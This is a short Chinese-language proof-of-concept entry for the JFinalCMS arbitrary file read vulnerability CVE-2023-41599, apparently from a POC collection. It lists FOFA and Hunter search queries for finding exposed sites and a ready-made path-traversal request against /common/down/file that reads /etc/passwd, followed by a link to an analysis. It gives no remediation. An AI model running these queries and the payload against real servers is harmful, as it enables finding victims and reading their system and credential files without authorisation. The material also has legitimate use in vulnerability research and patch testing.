## JFinalCMS 任意文件读取漏洞(CVE-2023-41599)


## 特征
```
fofa:
body="content=\"JreCms"

hunter:
web.body="content=\"JreCms"
```
## POC
```
Windows: /../../../../../../../../../test.txt
Linux:	/../../../../../../../../../etc/passwd

/common/down/file?filekey=/../../../../../../../../../etc/passwd
```


## 漏洞分析
http://www.so1lupus.ltd/2023/08/28/Directory-traversal-in-JFinalCMS/
